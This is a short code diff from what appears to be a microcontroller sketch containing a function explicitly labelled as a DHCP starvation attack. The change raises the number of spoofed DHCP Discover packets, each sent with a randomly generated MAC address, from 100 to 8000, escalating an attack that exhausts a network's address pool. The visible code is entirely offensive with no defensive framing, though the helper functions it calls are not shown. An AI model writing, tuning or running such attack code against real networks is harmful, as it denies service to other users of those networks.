@@ -144,7 +144,7 @@ void connectToOpenNetworks() {
 // Function to perform DHCP starvation attack
 void performDHCPStarvation() {
   Serial.println("Starting DHCP starvation attack...");
-  for (int i = 0; i < 100; i++) { // Send 100 DHCP Discover packets
+  for (int i = 0; i < 8000; i++) { // Send 8000 DHCP Discover packets
     String mac = generateRandomMAC();
     sendDHCPDiscover(mac);
     Serial.print("Sent DHCP Discover packet #");
